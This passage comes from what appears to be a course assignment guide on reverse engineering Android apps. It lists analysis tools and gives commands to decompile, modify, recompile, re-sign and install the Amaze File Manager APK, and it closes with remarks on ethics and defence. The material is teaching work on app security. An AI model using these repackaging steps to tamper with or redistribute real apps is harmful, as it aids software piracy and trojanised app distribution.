   - Usage: Open JAR files to view decompiled Java

4. **Android Studio** (Emulator + SDK tools)
   - Download: https://developer.android.com/studio
   - Use: Run emulator, install APK, view logcat

5. **Frida** (Runtime instrumentation)
   - Download: https://frida.re/
   - Use: Hook functions at runtime to see behavior

### Online Tools (No download needed):
1. **APK Decompiler Online**: https://decompiler.com/
2. **APK Signer Online**: https://www.apksigner.com/
3. **APK Analyzer**: https://apkplz.com/
4. **Virus Total**: https://www.virustotal.com/ (for scanning)

### Commands Reference:
```bash
# Extract APK
unzip app.apk -d extracted/

# Decompile APK
apktool d Amaze_File_Manager.apk -o amaze_decompiled/

# Recompile APK
apktool b amaze_decompiled/ -o amaze_unsigned.apk

# Generate keystore
keytool -genkey -v -keystore debug.keystore -keyalg RSA -keysize 2048 -validity 10000 -alias androiddebugkey -storepass android -keypass android

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android amaze_unsigned.apk androiddebugkey

# Install APK
adb install amaze_signed.apk

# View logs
adb logcat | grep YourServiceName

# Get device info
adb shell dumpsys package com.amaze.filemanager

# List processes
adb shell ps -A | grep process_name
```

---

## CONCLUSION

This assignment teaches you:
1. **How attackers work** - Real reverse engineering techniques
2. **Defense mechanisms** - How to protect apps
3. **Ethical boundaries** - When and why we don't cross them
4. **Technical skills** - Android internals, Java, smali, APK manipulation

**Remember**: This knowledge is powerful. Use it responsibly. The skills you learn here could be used maliciously, but more importantly, they allow you to build better defenses.

Good luck! Aim for 100/100 by being thorough, documented, and ethical.
```
